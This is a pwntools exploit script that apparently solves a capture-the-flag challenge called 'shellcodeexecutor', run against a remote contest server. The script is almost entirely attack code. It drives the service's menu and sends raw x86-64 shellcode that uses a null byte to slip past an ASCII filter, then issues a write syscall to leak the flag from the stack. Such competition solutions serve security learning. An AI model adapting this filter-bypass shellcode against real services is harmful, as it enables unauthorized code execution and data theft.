from pwn import *

pwnable = './shellcodeexecutor'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])
#context(os = 'linux', arch = 'amd64')

context.log_level = 'DEBUG'

debug_set = ''

debug_set_1 = '''
        b *0x5555555556f8
        b *0x55555555537a
        b *0x555555555373
        b *0x5555555555ab
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
else:
    p = remote('shellcode-executor.nc.jctf.pro', 1337)


p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
p.sendline("1")
p.recvuntil(":")
#null byte to bypass the ascii filter then do a simple write of the flag from the stack
p.sendline("\x56\x58\x00\x00\x48\x8d\x35\x75\x00\x00\x00\xba\x40\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xc3\x54\x68\x69\x73\x20")
p.recvuntil(">")
p.sendline("3")
p.recvline()
p.recvline()
p.recvline()
p.recvline()

p.wait_for_close()
